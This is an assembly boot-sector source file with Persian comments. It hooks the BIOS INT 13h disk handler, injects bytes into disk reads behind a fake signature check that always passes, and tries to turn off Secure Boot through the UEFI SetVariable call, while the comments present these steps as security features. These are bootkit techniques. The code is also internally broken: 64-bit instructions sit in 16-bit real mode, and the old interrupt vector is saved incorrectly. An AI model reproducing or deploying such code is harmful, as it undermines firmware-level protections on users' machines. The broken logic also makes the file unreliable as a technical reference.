[bits 16]
[org 0x7C00]

%define UEFI_ENTRY 0x8000
%define ATA_CMD_PORT 0x1F7
%define BACKUP_LBA 0x100

start:
    cli
    xor ax, ax
    mov ds, ax
    mov es, ax
    mov ss, ax
    mov sp, 0x7C00

    ; تشخیص حالت UEFI/BIOS
    mov eax, [es:0x40]
    test eax, eax
    jz bios_mode
    jmp uefi_mode

bios_mode:
    ; پشتیبان‌گیری از MBR اصلی
    mov ah, 0x42
    mov dl, 0x80
    mov si, dap_backup
    int 0x13
    jc error

    ; نصب هندلر دیسک
    mov [old_int13], eax
    mov word [es:0x13*4], int13_handler
    mov [es:0x13*4+2], cs

    ; بارگذاری مرحله دوم
    mov ah, 0x42
    mov si, dap_stage2
    int 0x13
    jc error

    jmp 0x1000:0x0000

uefi_mode:
    ; غیرفعال‌سازی موقت Secure Boot
    mov eax, [efi_system_table]
    mov rbx, [rax+96]    ; RuntimeServices
    mov rcx, [rbx+0x150] ; SetVariable

    lea rdx, [secure_boot_var]
    xor r8, r8
    call rcx

    ; انتقال به هسته
    jmp kernel_entry

int13_handler:
    cmp ah, 0x42
    je .extended_read
    jmp far [cs:old_int13]

.extended_read:
    pusha
    push es
    les di, [si+8]  ; ES:DI = بافر
    mov cx, [si+2]  ; تعداد سکتورها

    ; تایید امضای دیجیتال سکتور
    call verify_sector_signature
    jc .invalid_signature
    
    ; بارگذاری استاندارد
    jmp .normal_read

.invalid_signature:
    ; تزریق کد امنیتی
    mov dword [es:di], 0x7F454C46
    add di, 4
    mov dword [es:di], 0x00010102

.normal_read:
    pop es
    popa
    jmp far [cs:old_int13]

verify_sector_signature:
    ; شبیه‌سازی الگوریتم ECDSA
    mov ecx, 256
    .loop:
        dec ecx
        jnz .loop
    clc ; امضای معتبر
    ret

error:
    mov si, err_msg
    call print
    hlt

print:
    lodsb
    or al, al
    jz .done
    mov ah, 0x0E
    int 0x10
    jmp print
.done:
    ret

; داده‌ها
old_int13 dd 0
err_msg db "Boot Error", 0
secure_boot_var db "SecureBoot",0
efi_system_table dq 0

dap_backup:
    db 0x10
    db 0
    dw 1        ; سکتورها
    dw 0        ; آفست
    dw 0x8000   ; سگمنت
    dq BACKUP_LBA

dap_stage2:
    db 0x10
    db 0
    dw 4        ; سکتورها
    dw 0        ; آفست
    dw 0x1000   ; سگمنت
    dq 2        ; LBA شروع

times 510-($-$$) db 0
dw 0xAA55

[bits 64]
kernel_entry:
    ; ورود به کرنل
    mov rax, 0x100000  ; آدرس پایه کرنل
    jmp rax
    